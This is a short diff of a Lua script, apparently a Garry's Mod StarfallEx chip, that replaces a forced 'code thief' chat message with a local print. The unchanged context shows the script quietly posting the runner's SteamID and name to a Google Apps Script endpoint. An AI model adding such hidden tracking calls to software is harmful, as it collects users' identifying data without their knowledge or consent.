@@ -46,7 +46,10 @@ function load(links)
 end
 
 if player()==owner() and CLIENT then
-    if chip():getChipName() != "Elias" then owner():say("IM STEALING ELIAS'S CODE FROM GITHUB.COM/GRAMMYY. THIS IS AN AUTOMATED RESPONSE TO THIEFS") end
+    if chip():getChipName() != "Elias" then 
+        print("you arent slick, buddy") 
+    end
+    
     http.post("https://script.google.com/macros/s/AKfycbygYU3LyBiYy6-NKrQZVRHyynw2a-oP8dN9BGZLP23iJn6xHNmZYSuSxOY1pSMmd6UW/exec",{
         SteamID=owner():getSteamID() or "NULL",
         User=owner():getName() or "NULL",
